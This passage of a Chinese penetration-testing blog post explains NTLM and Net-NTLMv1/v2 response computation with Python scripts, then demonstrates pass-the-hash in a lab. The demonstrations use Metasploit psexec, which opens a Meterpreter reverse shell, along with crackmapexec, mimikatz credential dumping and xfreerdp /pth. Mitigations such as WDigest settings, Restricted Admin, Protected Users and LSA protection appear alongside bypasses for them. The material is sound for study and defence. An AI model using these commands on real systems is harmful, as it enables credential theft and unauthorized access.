+<p>注意:</p>
+<p>1.Chanllenge是Server产生的一个16字节的随机数，每次认证都不同</p>
+<p>2.Response的表现形式是Net-NTLM Hash，它是由客户端 提供的密码Hash加密Server返回的Chanllenge产生的结果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NT Hash = MD4(UTF-16-LE(password)) # 有时也会被叫为NTLM Hash</span><br><span class="line">NTLM Hash = LM Hash + NT Hash</span><br></pre></td></tr></table></figure>
+<p><strong>Net-NTLMv1 响应计算方法1</strong></p>
+<ol>
+<li>NT Hash后面补5个字节0，共21字节</li>
+<li>分成3组7字节，每7个比特后面添加1比特0，成为3个8字节的DES密钥</li>
+<li>使用步骤2得到的3个密钥，分别对8字节的挑战进行DES获得三组8字节密文，共组成24字节的密文，称为响应</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># NTLMv1 Response</span><br><span class="line"></span><br><span class="line"># NT Response</span><br><span class="line"># response 和 LAN Manager中的response计算方法一样 ，只是LM Hash被换为了NT Hash</span><br><span class="line">C = 8-byte server challenge</span><br><span class="line">K1 | K2 | K3 = NT-Hash | 5-bytes-0</span><br><span class="line">ntv1_response= DES(K1, C) | DES(K2, C) |  DES(K3, C)</span><br><span class="line"></span><br><span class="line"># LM Response</span><br><span class="line"># NTLMv1响应时会同时发送LM Response，计算方法和之前LM Response的计算方法相同</span><br></pre></td></tr></table></figure>
+<p><strong>响应的计算方法2</strong></p>
+<p>当NTLMSSP Negotiate Flags设置了Session Security标志位时，采用这种方法，若未设置该标志位，则采用上面那种方法</p>
+<ol>
+<li>NT Hash后面补5个字节0，共21字节</li>
+<li>分成3组7字节，每7个比特后面添加1比特0，成为3个8字节的DES密钥</li>
+<li>拼接8字节Server Challenge和8字节Client Challenge后，求其MD5，然后取MD5值的前8字节</li>
+<li>使用步骤2得到的3个密钥，分别对步骤3中得到的8字节数据进行DES加密获得三组8字节密文，共组成24字节的密文，称为响应</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># NTLMv1 Response</span><br><span class="line"></span><br><span class="line"># NT Response</span><br><span class="line"># response 和 LAN Manager中的response计算方法一样 ，只是LM Hash被换为了NT Hash</span><br><span class="line">C = 8-byte server challenge</span><br><span class="line">K1 | K2 | K3 = NT-Hash | 5-bytes-0</span><br><span class="line">ntv1_response = DES(K1, C) | DES(K2, C) |  DES(K3, C)</span><br><span class="line"></span><br><span class="line"># LM Response</span><br><span class="line"># 这种情况下的LM Response与Client Challenege相同，和不发送LM Response区别不大</span><br><span class="line">lm_response = 8-byte client challenge | 16-bytes-0</span><br></pre></td></tr></table></figure>
+<p><strong>上面计算的这个nt_response和lm_response一起被称为Net-NTLMv1 Hash</strong></p>
+<p>使用hashcat进行NTLMv1破解时需要提供的格式为username::hostname:LM response:NT response:challenge</p>
+<p>计算脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">nt_hash = sys.argv[<span class="number">1</span>].decode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"nt hash :"</span>, nt_hash.encode(<span class="string">"hex"</span>)</span><br><span class="line">server_challenge = sys.argv[<span class="number">2</span>].decode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"server challenge :"</span>, server_challenge.encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">3</span>:</span><br><span class="line">    <span class="comment"># 设置了session_security标志位的情况下，需要使用client_chanllenge计算NTLMv1 response</span></span><br><span class="line">    client_challenge = sys.argv[<span class="number">3</span>].decode(<span class="string">"hex"</span>)</span><br><span class="line">    session_security = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"client challenge :"</span>, client_challenge.encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 未设置session_security标志位的情况下，只需要使用server_chanllege计算NTLMv1 response</span></span><br><span class="line">    <span class="comment"># 网上广为流传的算法</span></span><br><span class="line">    session_security = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2bin</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = bin(int(string.encode(<span class="string">'hex'</span>), <span class="number">16</span>))[<span class="number">2</span>:].rjust(len(string)*<span class="number">8</span>, <span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2str</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = hex(int(string, <span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>).strip(<span class="string">"L"</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(string)</span>:</span></span><br><span class="line">    bin_str = str2bin(string)</span><br><span class="line">    bin_str = [bin_str[i:i+<span class="number">7</span>] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">7</span>)]</span><br><span class="line">    result = <span class="string">""</span>.join([i.ljust(<span class="number">8</span>, <span class="string">'0'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> bin_str])</span><br><span class="line">    result = bin2str(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_encrypt</span><span class="params">(key, data)</span>:</span></span><br><span class="line">    des = pyDes.des(key, pyDes.ECB, pad=<span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">return</span> des.encrypt(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = nt_hash + <span class="string">"\x00"</span> * <span class="number">5</span></span><br><span class="line">k1 = padding(key[:<span class="number">7</span>])</span><br><span class="line">k2 = padding(key[<span class="number">7</span>:<span class="number">14</span>])</span><br><span class="line">k3 = padding(key[<span class="number">14</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> session_security:</span><br><span class="line">    chall = server_challenge + client_challenge</span><br><span class="line">    data = hashlib.md5(chall).digest()[:<span class="number">8</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    data = server_challenge    </span><br><span class="line"></span><br><span class="line">response = des_encrypt(k1, data) + des_encrypt(k2, data) + des_encrypt(k3, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> response.encode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
+<p><strong>Net-NTLMv2</strong></p>
+<p>NTLM v1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是NTLM Hash。</p>
+<p>下面细说一下有什么不同:</p>
+<p>Challage:NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。</p>
+<p>Net-NTLM Hash:NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。</p>
+<p>响应计算办法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 不使用LM Hash </span><br><span class="line"># 加密算法使用HMAC-MD5 替换DES算法 </span><br><span class="line">SC = 8-byte server challenge, random</span><br><span class="line">CC = 8-byte client challenge, random</span><br><span class="line">CC* = (X, time, CC, domain name)</span><br><span class="line">v2-Hash = HMAC-MD5(NT-Hash, user name | domain name) # nthash作为算法的key</span><br><span class="line">LMv2 = HMAC-MD5(v2-Hash, SC | CC) # LMv2 Response</span><br><span class="line">NTv2 = HMAC-MD5(v2-Hash, SC | CC*) | CC* # NTv2 Response</span><br><span class="line">Net-NTLMv2 response = LMv2 | NTv2</span><br></pre></td></tr></table></figure>
+<p><strong>这个LMv2 Response与NTv2 Response合在一起被称为Net-NTLMv2 Hash</strong></p>
+<p>使用hashcat进行NTLMv2破解时需要提供的格式为username::domain:server challenge:ntproofstr:ntv2 response除去ntproofstr之外的部分</p>
+<p>计算脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import hmac</span><br><span class="line"></span><br><span class="line">sc = &quot;1728a577309f421b&quot;.decode(&quot;hex&quot;)</span><br><span class="line">cc = &quot;6fecd5032e7e415c&quot;.decode(&quot;hex&quot;)</span><br><span class="line"># NTv2 Response中NTProofStr之后的内容</span><br><span class="line">ccsharp = &quot;0101000000000000d6535ec1478ed4016fecd5032e7e415c0000000002001600570049004e002d005700450042002d00500045004e0001001600570049004e002d005700450042002d00500045004e0004001600570049004e002d005700650062002d00500065006e0003001600570049004e002d005700650062002d00500065006e000700080039318ec1478ed4010000000000000000&quot;.decode(&quot;hex&quot;)</span><br><span class="line">user = &quot;dlive&quot;</span><br><span class="line">domain = &quot;WIN-WEB-PEN&quot;</span><br><span class="line"># password: dlivedlivedlive</span><br><span class="line">nt_hash = &quot;27b9d12aa127a07b1d03a4a890326aeb&quot;.decode(&quot;hex&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def hmac_md5(key, data):</span><br><span class="line">    h = hmac.new(key)</span><br><span class="line">    h.update(data)</span><br><span class="line">    return h.digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v2_hash = hmac_md5(nt_hash, user.upper().encode(&apos;utf-16le&apos;) + domain.encode(&apos;utf-16le&apos;))</span><br><span class="line">lmv2 = hmac_md5(v2_hash, sc + cc) + cc</span><br><span class="line">ntv2 = hmac_md5(v2_hash, sc + ccsharp) + ccsharp</span><br><span class="line"></span><br><span class="line">print lmv2.encode(&quot;hex&quot;)</span><br><span class="line">print ntv2.encode(&quot;hex&quot;)</span><br></pre></td></tr></table></figure>
+<p><strong>挑战响应级别配置</strong></p>
+<p>gpedit.msc，设置之后通过gpupdate命令使其立即生效</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g70i0djnt8j30k50e5my5.jpg" alt="截图_2019-09-15_20-56-52.png"></p>
+<p>各个系统默认配置如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows 2000 以及 Windows XP: 发送 LM &amp; NTLM 响应</span><br><span class="line"></span><br><span class="line">Windows Server 2003: 仅发送 NTLM 响应</span><br><span class="line"></span><br><span class="line">Windows Vista、Windows Server 2008、Windows 7 以及 Windows Server 2008 R2: 仅发送 NTLMv2 响应</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g70i83grvfj3142078wfr.jpg" alt="2.png"></p>
+<h3 id="Pass-The-Hash（哈希传递攻击）"><a href="#Pass-The-Hash（哈希传递攻击）" class="headerlink" title="Pass The Hash（哈希传递攻击）"></a>Pass The Hash（哈希传递攻击）</h3><ul>
+<li>什么是哈希传递?</li>
+</ul>
+<p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。</p>
+<ul>
+<li>哈希传递的作用?</li>
+</ul>
+<p>解决了我们渗透中获取不到明文密码、破解不了NTLM Hash而又 想扩大战果的问题。</p>
+<p><strong>Pass The Hash - 必要条件</strong></p>
+<ul>
+<li>哈希传递需要被认证的主机能够访问到服务器(废话)</li>
+<li>哈希传递需要被传递认证的用户名</li>
+<li>哈希传递需要被传递认证用户的NTLM Hash</li>
+</ul>
+<p>要完成一个NTLM认证，第一步需要客户端将自己要参与认证的 用户名发送至服务器端，等待服务器端给出的Challenge⋯⋯</p>
+<p>其实哈希传递就是使用用户名对应的NTLM Hash将服务器给出的 Chanllenge加密，生成一个Response，来完成认证。</p>
+<p>Pass The Hash的工具：</p>
+<ul>
+<li>Smbmap</li>
+<li>CrackMapExec</li>
+<li>Smbexec</li>
+<li>Metasploit（exploit/windows/smb/psexec_psh<br>）</li>
+<li>wmiexec</li>
+<li>Invoke-WMIExec</li>
+<li>Invoke-SMBExec</li>
+<li>mimikatz（Overpass-the-hash）</li>
+</ul>
+<p><strong>msf下操作：</strong></p>
+<p>假设已经得到了目标的hash</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g70jp6qwxkj30qw08ktah.jpg" alt="截图_2019-09-15_21-55-28.png"></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g70jpmf0grj30nv04575e.jpg" alt="截图_2019-09-15_21-55-59.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBDomain ROOT-5DE52AC98B</span><br><span class="line">SMBDomain =&gt; ROOT-5DE52AC98B</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbuser Administrator</span><br><span class="line">smbuser =&gt; Administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbpass 44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line">smbpass =&gt; 44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.2.100:4444 </span><br><span class="line">[*] 192.168.2.114:445 - Connecting to the server...</span><br><span class="line">[*] 192.168.2.114:445 - Authenticating to 192.168.2.114:445|ROOT-5DE52AC98B as user &apos;Administrator&apos;...</span><br><span class="line">[*] 192.168.2.114:445 - Selecting native target</span><br><span class="line">[*] 192.168.2.114:445 - Uploading payload... BgrxolOa.exe</span><br><span class="line">[*] 192.168.2.114:445 - Created \BgrxolOa.exe...</span><br><span class="line">[+] 192.168.2.114:445 - Service started successfully...</span><br><span class="line">[*] 192.168.2.114:445 - Deleting \BgrxolOa.exe...</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.2.114</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.2.100:4444 -&gt; 192.168.2.114:1088) at 2019-09-15 21:44:19 +0800</span><br></pre></td></tr></table></figure>
+<p><strong>mimikatz（Overpass-the-hash）</strong></p>
+<p>注：需要administrator权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:03bebb338e70244589ea67c7439c77ba</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g70kxy0i6lj30yh0cegly.jpg" alt="截图_2019-09-15_22-38-33.png"></p>
+<p><strong>crackmapexec</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> ⚡ root@kali  ~  crackmapexec smb  192.168.2.114 -u Administrator -H 44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 -x whoami</span><br><span class="line">CME          192.168.2.114:445 ROOT-5DE52AC98B [*] Windows Server 2003 3790 Service Pack 2 (name:ROOT-5DE52AC98B) (domain:ROOT-5DE52AC98B)</span><br><span class="line">CME          192.168.2.114:445 ROOT-5DE52AC98B [+] ROOT-5DE52AC98B\Administrator 44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 (Pwn3d!)</span><br><span class="line">CME          192.168.2.114:445 ROOT-5DE52AC98B [+] Executed command </span><br><span class="line">CME          192.168.2.114:445 ROOT-5DE52AC98B root-5de52ac98b\administrator</span><br><span class="line">[*] KTHXBYE!</span><br><span class="line"> ⚡ root@kali  ~ </span><br></pre></td></tr></table></figure>
+<h3 id="Pass-The-Hash-缓解"><a href="#Pass-The-Hash-缓解" class="headerlink" title="Pass The Hash 缓解"></a>Pass The Hash 缓解</h3><p>1、禁止NTLM认证</p>
+<p>2、防止NTLM Hash被获取到</p>
+<h4 id="kb2871997"><a href="#kb2871997" class="headerlink" title="kb2871997"></a>kb2871997</h4><p>kb2871997在缓解PtH上做出了不少努力，其为windows增加的特性值得深入研究。它在win server 2012 R2及以上版本已默认集成。<br>根据微软公告，安装kb2871997后会有这么些行为：</p>
+<p>删除lsass的明文凭证</p>
+<p>lsass进程会缓存用户凭据，有明文有Hash，这取决于使用的ssp类型以及补丁情况。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7ezp69anwj30yt0klgm1.jpg" alt="截图_2019-09-28_09-45-51.png"></p>
+<p>msv、tspkg、wdigest、kerberos这几个ssp都获取到了凭据，它们分别用于Terminal Server认证（RDSH），ntlm认证，摘要认证以及kerberos认证。我们能看到只有msv没有明文密码。从前文中对ntlm认证过程的描述，我们可以发现除了第一步客户端要求用户输入明文密码，之后的认证过程再也没有出现过明文密码。这也就是说，ssp只需要计算ntlm hash并放在内存中就行了。<br>我们看到摘要认证wdigest在windows 2008 中缓存了明文密码。摘要认证类似于ntlm认证，也使用了挑战-响应机制，但它与ntlm认证较大的区别在于客户端计算响应时，需要使用到明文密码，为了实现SSO，需要将明文密码放在内存中方便进行计算，因此客户端一方的ssp理论上必须在内存中缓存明文密码，这也是为什么我们能抓到明文密码的原因；</p>
+<p>kb2871997会删除除了wdigest ssp以外其他ssp的明文凭据，但对于wdigest ssp只能选择禁用。用户可以选择将</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential更改为0来禁用。</span><br></pre></td></tr></table></figure>
+<p>操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\&quot; /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7f0swocdfj30fo04kglg.jpg" alt="截图_2019-09-28_10-25-04.png"></p>
+<p>安装kb2871997之后我们使用mimikatz抓取内存中的密码：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7f0vhno3jj30i20bmglo.jpg" alt="截图_2019-09-28_10-27-31.png"></p>
+<p>wdigest ssp默认仍然在内存中存储明文密码，更改注册表后注销，重新登录，再次抓取</p>
+<p>wdigest已经抓不到明文密码以及密码hash。</p>
+<h4 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h4><p>这仅仅是增大了从内存中获取ntlm hash的难度，但并不能阻止从注册表等其他地方获取。</p>
+<p>自动化脚本：</p>
+<p><a href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed/blob/master/dump.ps1" target="_blank" rel="noopener">https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed/blob/master/dump.ps1</a></p>
+<p>使用方法：</p>
+<p>PowerShell.exe -ExecutionPolicy Bypass -File dump.ps1</p>
+<p>注意使用的时候，需要在c盘下具有以下文件C:\test\pwd.txt，不然会报错</p>
+<p>运行后会自动注销，当用户重新登陆的时候就可以抓取到明文密码了</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7f1dqltxyj313n0dsmxw.jpg" alt="截图_2019-09-28_10-45-08.png"></p>
+<h4 id="添加“受限管理员模式”"><a href="#添加“受限管理员模式”" class="headerlink" title="添加“受限管理员模式”"></a>添加“受限管理员模式”</h4><p>受限管理员模式能阻止主机缓存内存中远程验证用户的凭据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">适用系统</span><br><span class="line">Windows 8.1和Windows Server 2012 R2默认支持该功能</span><br><span class="line"></span><br><span class="line">Windows 7和Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351</span><br></pre></td></tr></table></figure>
+<p>对应命令行开启的命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+<p>测试一： RDP客户端使用微软自家的mstsc，服务端未打kb2871997，不加任何参数启动：</p>
+<p>登录成功后，使用mimikatz可以获取内存中的密码</p>
+<p>测试二：客户端使用mstsc /restrictedadmin，也即受限管理员模式启动，服务端支持受限管理员模式：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7f20eaecyj30h50akdgm.jpg" alt="截图_2019-09-28_11-06-56.png"></p>
+<p>连接成功后，使用mimikatz获取内存中的密码：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7f21eh1w3j30h204s3z0.jpg" alt="截图_2019-09-28_11-07-55.png"></p>
+<p>原因：</p>
+<p>远程桌面默认无约束委派用户凭据，以达到完全在远程服务器上代表用户的目的。当我们连接到远程桌面服务器上，可以使用dir命令连接其他的smb服务器并使用我们的凭据认证，这是因为客户端进行远程桌面连接的时候会发送用户的明文密码，这个密码可以用于计算NTLM Hash并缓存在远程桌面服务器上。</p>
+<p>受限管理员模式下，远程桌面客户端会首先使用客户端机器上已缓存的NTLM Hash进行认证，不需要用户输入用户名和密码，也就不会把明文密码委派到目标；即便缓存的hash认证失败，用户必须输入明文密码，mstsc也不会直接发送明文密码，而是计算出所需的值后再发送。这种模式下，登录到远程桌面服务器上并使用dir命令向其他smb服务器认证时，将使用空用户(用户名\ )登录，几乎都会登陆失败。</p>
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure>
+<p>方法2： FreeRDP</p>
+<p>linux下使用明文远程登录的参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:administrator /p:test123! /v:192.168.62.136 /cert-ignore</span><br></pre></td></tr></table></figure>
+<p>测试成功</p>
+<p>linux下使用hash远程登录的参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:administrator /pth:d25ecd13fddbb542d2e16da4f9e0333d /v:192.168.62.136 /cert-ignore</span><br></pre></td></tr></table></figure>
+<p>包含pth功能的旧版FreeRDP的的下载地址：</p>
+<p><a href="https://labs.portcullis.co.uk/download/FreeRDP-pth.tar.gz" target="_blank" rel="noopener">https://labs.portcullis.co.uk/download/FreeRDP-pth.tar.gz</a></p>
+<h4 id="Protected-Users"><a href="#Protected-Users" class="headerlink" title="Protected Users"></a>Protected Users</h4><p>受保护用户是一个新的域全局安全组，对于该组的成员，Windows 8.1设备或Windows Server 2012 R2主机不会缓存受保护用户不支持的凭据。如果这些组的成员登录到运行早于Windows 8.1的Windows版本的设备，则该组的成员没有其他保护。</p>
+<p>登录到Windows 8.1设备和Windows Server 2012 R2主机的受保护用户组的成员不能再使用：</p>
+<ul>
+<li>默认凭据委派（CredSSP） - 即使启用了“ 允许委派默认凭据”策略，也不会缓存纯文本凭据</li>
+<li>Windows摘要 - 即使启用明文凭据也不会进行缓存</li>
+<li>NTLM - NTOWF未缓存</li>
+<li>Kerberos长期密钥 - Kerberos票证授予票证（TGT）在登录时获取，无法自动重新获取</li>
+<li>离线登录 - 未创建缓存的登录验证程序</li>
+</ul>
+<p>如果域功能级别是Windows Server 2012 R2，则该组的成员不能再：</p>
+<ul>
+<li>使用NTLM身份验证进行身份验证</li>
+<li>在Kerberos预身份验证中使用数据加密标准（DES）或RC4密码套件</li>
+<li>通过使用无约束或约束委派来委派</li>
+<li>更新用户票证（TGT）超过最初的4小时生命周期</li>
+</ul>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7f2iw88gzj30h50lognz.jpg" alt="截图_2019-09-28_11-24-43.png"></p>
+<p>在域账户未加入Protected Users组时，我们使用mimikatz获取内存中的凭据：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7f2ji8g5ij30hh0760us.jpg" alt="截图_2019-09-28_11-25-19.png"></p>
+<p>我们将此用户加入Protected Users:<br><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7f2jzqzioj30hp076jt7.jpg" alt="截图_2019-09-28_11-25-47.png"></p>
+<p>网上有些文章提到了Pass-the-Key（Overpass-the-hash），Protected Users对这种攻击方式也有一定缓解功能。PtK是在域中攻击kerberos认证的一种方式，据称可以在NTLM认证被禁止的情况下用来实现类似PtH的功能（毕竟是针对kerberos认证，其实与NTLM认证没什么关系）。</p>
+<p>这可以使用mimikatz中的==sekurlsa::ekeys==来获取：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7f2m7qqfvj30mq0jbwew.jpg" alt="截图_2019-09-28_11-27-53.png"></p>
+<h4 id="Additional-LSA-Protection"><a href="#Additional-LSA-Protection" class="headerlink" title="Additional LSA Protection"></a>Additional LSA Protection</h4><p>LSA（包括本地安全机构服务器服务（LSASS）进程）验证用户是否进行本地和远程登录，并实施本地安全策略。Windows 8.1操作系统为LSA提供额外保护，以防止未受保护的进程读取内存和代码注入。启用此功能后无法把debugger attach到进程上。在win8.1及2012 r2以上有效，启用的方法是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1</span><br></pre></td></tr></table></figure>
+<p>使用mimikatz抓取内存中的密码：</p>
